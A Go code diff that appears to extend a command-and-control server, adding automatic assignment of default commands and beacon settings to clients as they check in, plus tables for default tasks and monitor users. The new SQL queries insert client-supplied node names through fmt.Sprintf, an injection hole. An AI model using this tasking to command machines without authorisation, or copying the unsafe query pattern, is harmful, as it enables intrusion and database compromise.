@@ -168,7 +168,7 @@ func StartServer(ip string, port string, uri string) {
 		processError(err)
 	}
 
-	d := fmt.Sprintf("[+] Go Backend: { HTTPVersion = 2 }\n[+] Server started")
+	d := fmt.Sprintf("\n[+] Go Backend: { HTTPVersion = 2 }\n[+] Server started on %s:%s", ip, port)
 	log.Print(d)
 
 	// Start TLS Server
@@ -291,6 +291,7 @@ func taskHandler(w http.ResponseWriter, req *http.Request) {
 					strings.TrimSpace(c[4]), w, z)
 
 				fmt.Println("[+] New client pulse from", a.Node)
+				moveServed(a.Node)
 			} else {
 				http.Error(w, "page not found", 404)
 				return
@@ -440,6 +441,23 @@ func AddNewClient(a string, s string, ar string, o string, c int, j int) {
 	command := fmt.Sprintf(t, a, ar, o, s, c, j, GetCurrentEpoch(), GetCurrentEpoch())
 	exec(command)
 	fmt.Printf("[+] New client checked in: %s\n", a)
+}
+
+// Move Served default jobs to tasks database
+func moveServed(a string) {
+//	time.Sleep(15 * time.Second)
+        t := "INSERT INTO tasks (node,command) (SELECT node,command FROM defaults where status='cooked' AND command !='')"
+        m := fmt.Sprintf(t)
+        exec(m)
+        c := "UPDATE clients SET comms=defaults.comms FROM defaults WHERE defaults.comms !=0 AND clients.node='%s';"
+        co := fmt.Sprintf(c, a)
+        exec(co)
+        f := "UPDATE clients SET flex=defaults.flex FROM defaults WHERE defaults.flex !=0 AND clients.node='%s';"
+        fl := fmt.Sprintf(f, a)
+        exec(fl)
+        d := "UPDATE tasks SET node='%s', status='Deployed', taskdate=%d, completedate=0, complete='false' WHERE node='default';"
+        x := fmt.Sprintf(d, a, GetCurrentEpoch())
+        exec(x)
 }
 
 // Get client tasks
@@ -611,6 +629,8 @@ func CreateSchemas() {
 	createTaskSchema()
 	createResultSchema()
 	createTokenSchema()
+	createUserSchema()
+	createDefaultSchema()
 }
 
 // Create Postgres database schema for clients
@@ -637,7 +657,7 @@ func createTaskSchema() {
         CREATE TABLE IF NOT EXISTS tasks (
           id SERIAL PRIMARY KEY,
           node TEXT,
-   	      job SERIAL UNIQUE,
+   	  job SERIAL UNIQUE,
           command TEXT,
           status TEXT,
           taskDate INTEGER,
@@ -646,6 +666,21 @@ func createTaskSchema() {
         );
     `
 	exec(taskSchema)
+}
+
+// Create Postgres database for default tasks
+func createDefaultSchema() {
+	defaultSchema := `
+		CREATE TABLE IF NOT EXISTS defaults (
+			id SERIAL PRIMARY KEY,
+			node TEXT,
+			command TEXT,
+			status Text,
+			comms INTEGER,
+			flex INTEGER
+	  	);
+	`
+	exec(defaultSchema)
 }
 
 // Create Postgres database schema for results
@@ -674,3 +709,16 @@ func createTokenSchema() {
     `
 	exec(tokenSchema)
 }
+
+// Create postgres database schema for monitor users
+func createUserSchema() {
+        userSchema := `
+                CREATE TABLE IF NOT EXISTS users (
+                        id SERIAL PRIMARY KEY,
+                        username VARCHAR(20) UNIQUE NOT NULL,
+                        password VARCHAR(60) NOT NULL
+                );
+        `
+        exec(userSchema)
+}
+
